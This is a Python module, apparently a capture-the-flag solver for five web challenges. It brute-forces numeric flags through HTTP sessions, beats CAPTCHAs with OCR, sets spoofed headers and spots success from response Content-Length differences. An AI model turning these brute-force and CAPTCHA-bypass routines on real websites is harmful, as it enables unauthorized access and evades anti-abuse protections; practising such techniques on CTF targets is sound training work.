"""
Module pour gerer les sessions HTTP et resoudre les challenges CAPTCHA.
"""
import re
import time
import requests
from requests.exceptions import RequestException, ConnectionError
from typing import Optional, Callable

from .config import (
    logger,
    BASE_URL,
    get_challenge_url,
    get_challenge_headers,
    get_challenge_flag_range,
    challenge_needs_captcha,
    CHALLENGES,
)
from .captcha import Captcha, solve_captcha


# Configuration retry
MAX_RETRIES = 3
RETRY_DELAY = 2  # secondes


class ChallengeSession:
    """
    Gere une session pour resoudre un challenge CAPTCHA.

    Cette classe encapsule:
    - La gestion de session HTTP avec cookies
    - Les headers requis (Magic-Word, User-Agent, etc.)
    - La resolution de captcha par OCR
    - Le bruteforce de flags
    - La detection de succes par Content-Length ou contenu
    """

    # Patterns regex pour extraire les flags
    FLAG_PATTERNS = [
        r"FLAG-\d+\{[^}]+\}",  # Format standard
        r"F\s*L\s*A\s*G\s*-\s*\d+\s*\{([^}]+)\}",  # Format avec espaces (ch5)
    ]

    def __init__(self, challenge_num: int):
        """
        Initialise la session pour un challenge.

        Args:
            challenge_num: Numero du challenge (1-5)
        """
        self.challenge_num = challenge_num
        self.url = get_challenge_url(challenge_num)
        self.headers = get_challenge_headers(challenge_num)
        self.flag_min, self.flag_max = get_challenge_flag_range(challenge_num)
        self.needs_captcha = challenge_needs_captcha(challenge_num)

        self.session = None
        self.found_flag = None
        self.flag_string = None
        self.response = None

        # Pour l'analyse par Content-Length
        self.content_lengths = {}

    def _create_session(self) -> requests.Session:
        """Cree une nouvelle session HTTP avec les headers configures."""
        session = requests.Session()
        session.headers.update(self.headers)
        return session

    def _safe_get(self, url: str, **kwargs) -> Optional[requests.Response]:
        """GET avec retry en cas d'erreur."""
        for attempt in range(MAX_RETRIES):
            try:
                return self.session.get(url, timeout=30, **kwargs)
            except RequestException as e:
                if attempt < MAX_RETRIES - 1:
                    logger.warning(f"  Erreur GET (tentative {attempt + 1}): {e}")
                    time.sleep(RETRY_DELAY * (attempt + 1))
                else:
                    logger.error(f"  Echec GET apres {MAX_RETRIES} tentatives")
                    return None
        return None

    def _safe_post(self, url: str, **kwargs) -> Optional[requests.Response]:
        """POST avec retry en cas d'erreur."""
        for attempt in range(MAX_RETRIES):
            try:
                return self.session.post(url, timeout=30, **kwargs)
            except RequestException as e:
                if attempt < MAX_RETRIES - 1:
                    logger.warning(f"  Erreur POST (tentative {attempt + 1}): {e}")
                    time.sleep(RETRY_DELAY * (attempt + 1))
                else:
                    logger.error(f"  Echec POST apres {MAX_RETRIES} tentatives")
                    return None
        return None

    def _get_post_headers(self) -> dict:
        """Retourne les headers pour une requete POST."""
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": self.url,
        }
        headers.update(self.headers)
        return headers

    def _extract_flag(self, html: str) -> Optional[str]:
        """
        Extrait le flag d'une reponse HTML.

        Args:
            html: Contenu HTML de la reponse

        Returns:
            Le flag trouve ou None
        """
        for pattern in self.FLAG_PATTERNS:
            match = re.search(pattern, html)
            if match:
                # Nettoyer les espaces si format ch5
                flag = match.group(0).replace(" ", "")
                # Reconstruire le flag si on a capture le contenu
                if match.lastindex:
                    flag = f"FLAG-{self.challenge_num}{{{match.group(1)}}}"
                return flag
        return None

    def _is_success(self, response: requests.Response, expected_cl: str = None) -> bool:
        """
        Detecte si la reponse indique un succes.

        Args:
            response: Reponse HTTP
            expected_cl: Content-Length attendu pour succes (optionnel)

        Returns:
            True si succes detecte
        """
        # Detection par Content-Length specifique
        if expected_cl:
            cl = response.headers.get("Content-Length", "")
            if cl == expected_cl:
                return True

        html = response.text
        html_lower = html.lower()

        # Detection par presence d'un vrai FLAG (format FLAG-X{...})
        if re.search(r"FLAG-\d+\{[^}]+\}", html):
            return True

        # Detection par message de succes explicite
        if "correct!" in html_lower or "congratulation" in html_lower:
            return True

        # Eviter les faux positifs:
        # - "Flag is an integer" = description, pas succes
        # - "Incorrect" = echec
        if "incorrect" in html_lower or "wrong" in html_lower:
            return False

        return False

    def solve_without_captcha(self) -> Optional[str]:
        """
        Resout un challenge sans captcha (bruteforce simple).

        Returns:
            Le flag trouve ou None
        """
        logger.info(f"=== Challenge {self.challenge_num} (sans captcha) ===")
        logger.info(f"Bruteforce {self.flag_min}-{self.flag_max}")

        for flag in range(self.flag_min, self.flag_max + 1):
            self.session = self._create_session()

            # GET avec gestion d'erreur
            if self._safe_get(self.url) is None:
                continue

            # POST avec gestion d'erreur
            response = self._safe_post(
                self.url,
                data=f"flag={flag}&submit=Submit",
                headers=self._get_post_headers(),
            )

            if response is None:
                continue

            if flag % 200 == 0:
                logger.info(f"  flag={flag}")

            if self._is_success(response):
                self.found_flag = flag
                self.flag_string = self._extract_flag(response.text)
                if self.flag_string:
                    logger.info(f"  FLAG trouve: {self.flag_string}")
                    return self.flag_string
                return f"flag={flag}"

        return None

    def solve_with_captcha(self) -> Optional[str]:
        """
        Resout un challenge avec captcha (bruteforce + OCR).
        Utilise l'analyse par Content-Length pour detecter le bon flag.

        Returns:
            Le flag trouve ou None
        """
        logger.info(f"=== Challenge {self.challenge_num} (avec captcha + CL) ===")
        logger.info(f"Bruteforce {self.flag_min}-{self.flag_max}")

        self.content_lengths = {}
        tested_count = 0

        for flag in range(self.flag_min, self.flag_max + 1):
            self.session = self._create_session()

            # GET avec gestion d'erreur
            if self._safe_get(self.url) is None:
                continue

            # Resoudre le captcha
            captcha_value = solve_captcha(self.session)
            if not captcha_value or len(captcha_value) != 6:
                continue  # Retry au prochain flag

            # POST avec gestion d'erreur
            response = self._safe_post(
                self.url,
                data=f"flag={flag}&captcha={captcha_value}&submit=Submit",
                headers=self._get_post_headers(),
            )

            if response is None:
                continue

            tested_count += 1

            # Stocker le Content-Length pour analyse
            cl = response.headers.get("Content-Length", "0")
            if cl not in self.content_lengths:
                self.content_lengths[cl] = []
            self.content_lengths[cl].append(flag)

            if flag % 100 == 0:
                logger.info(f"  flag={flag}, CL={cl}, tested={tested_count}")

            # Verifier succes direct (FLAG trouve dans la reponse)
            flag_str = self._extract_flag(response.text)
            if flag_str:
                self.found_flag = flag
                self.flag_string = flag_str
                logger.info(f"  FLAG trouve: {flag_str}")
                return flag_str

        logger.info(f"  Total teste: {tested_count} flags")

        # Analyser les Content-Length pour trouver le flag unique
        return self._analyze_content_lengths()

    def _analyze_content_lengths(self) -> Optional[str]:
        """
        Analyse les Content-Length pour trouver le flag avec CL unique.

        Returns:
            Le flag trouve ou None
        """
        logger.info("  Analyse des Content-Length...")

        # Trier par CL decroissant (succes = reponse plus longue)
        for cl, flags in sorted(
            self.content_lengths.items(),
            key=lambda x: int(x[0]) if x[0].isdigit() else 0,
            reverse=True,
        ):
            if len(flags) == 1:
                candidate = flags[0]
                logger.info(f"  Candidat unique: flag={candidate} (CL={cl})")

                # Verifier ce flag
                result = self._verify_flag(candidate)
                if result:
                    return result

        return None

    def _verify_flag(self, flag: int) -> Optional[str]:
        """
        Verifie un flag candidat.

        Args:
            flag: Valeur du flag a verifier

        Returns:
            Le flag string ou None
        """
        self.session = self._create_session()
        if self._safe_get(self.url) is None:
            return f"flag={flag} (connection failed)"

        captcha_value = solve_captcha(self.session)
        if not captcha_value or len(captcha_value) != 6:
            return f"flag={flag} (OCR failed)"

        response = self._safe_post(
            self.url,
            data=f"flag={flag}&captcha={captcha_value}&submit=Submit",
            headers=self._get_post_headers(),
        )

        if response is None:
            return f"flag={flag} (connection failed)"

        self.response = response
        self.found_flag = flag
        self.flag_string = self._extract_flag(response.text)

        if self.flag_string:
            return self.flag_string

        return f"flag={flag}"

    def solve_challenge_4(self) -> Optional[str]:
        """
        Resout le challenge 4 (Magic-Word + 2 etapes).

        Returns:
            Le flag trouve ou None
        """
        logger.info("=== Challenge 4 (Magic-Word + 2 etapes) ===")

        # Etape 1: Trouver le bon flag (sans captcha)
        logger.info("Etape 1: Recherche du flag...")
        for flag in range(self.flag_min, self.flag_max + 1):
            self.session = self._create_session()

            if self._safe_get(self.url) is None:
                continue

            response = self._safe_post(
                self.url,
                data=f"flag={flag}&submit=Submit",
                headers=self._get_post_headers(),
            )

            if response is None:
                continue

            if flag % 200 == 0:
                logger.info(f"  flag={flag}")

            if "Correct" in response.text:
                self.found_flag = flag
                logger.info(f"  Flag trouve: {flag}")
                break
        else:
            return None

        # Etape 2: Resoudre le captcha
        logger.info("Etape 2: Resolution du captcha...")
        self.session = self._create_session()

        if self._safe_get(self.url) is None:
            return f"flag={self.found_flag} (connection failed)"

        # Soumettre pour faire apparaitre le captcha
        self._safe_post(
            self.url,
            data=f"flag={self.found_flag}&submit=Submit",
            headers=self._get_post_headers(),
        )

        captcha_value = solve_captcha(self.session)
        if not captcha_value or len(captcha_value) != 6:
            return f"flag={self.found_flag} (captcha failed)"

        response = self._safe_post(
            self.url,
            data=f"flag={self.found_flag}&captcha={captcha_value}&submit=Submit",
            headers=self._get_post_headers(),
        )

        if response is None:
            return f"flag={self.found_flag} (connection failed)"

        self.flag_string = self._extract_flag(response.text)
        if self.flag_string:
            return self.flag_string

        return f"flag={self.found_flag}"

    def solve_challenge_5(self) -> Optional[str]:
        """
        Resout le challenge 5 (Magic-Word + User-Agent + CL different).

        Le flag est cache avec des espaces dans le message d'erreur.

        Returns:
            Le flag trouve ou None
        """
        logger.info("=== Challenge 5 (Magic-Word + User-Agent + OCR) ===")

        # Verifier l'acces
        try:
            test_response = requests.get(self.url, headers=self.headers, timeout=30)
            if test_response.status_code == 403:
                logger.warning("Acces refuse - verifier Magic-Word et User-Agent")
                return None
        except RequestException as e:
            logger.error(f"Erreur de connexion: {e}")
            return None

        logger.info("Acces autorise")

        for flag in range(self.flag_min, self.flag_max + 1):
            self.session = self._create_session()

            if self._safe_get(self.url) is None:
                continue

            captcha_value = solve_captcha(self.session)
            if not captcha_value or len(captcha_value) != 6:
                continue

            response = self._safe_post(
                self.url,
                data=f"flag={flag}&captcha={captcha_value}&submit=Submit",
                headers=self._get_post_headers(),
            )

            if response is None:
                continue

            cl = response.headers.get("Content-Length", "0")

            if flag % 100 == 0:
                logger.info(f"  flag={flag}, CL={cl}")

            # Detecter CL different (succes)
            if cl != "549":
                logger.info(f"  CL different: flag={flag}, CL={cl}")
                self.found_flag = flag
                self.flag_string = self._extract_flag(response.text)

                if self.flag_string:
                    return self.flag_string

                return f"flag={flag} (CL={cl})"

        return None

    def solve(self) -> Optional[str]:
        """
        Resout le challenge selon son type.

        Returns:
            Le flag trouve ou None
        """
        # Challenges speciaux
        if self.challenge_num == 4:
            return self.solve_challenge_4()
        if self.challenge_num == 5:
            return self.solve_challenge_5()

        # Challenges standards
        if self.needs_captcha:
            return self.solve_with_captcha()
        else:
            return self.solve_without_captcha()

    def get_result(self) -> dict:
        """Retourne les resultats de la resolution."""
        return {
            "challenge": self.challenge_num,
            "flag_value": self.found_flag,
            "flag_string": self.flag_string,
            "url": self.url,
        }
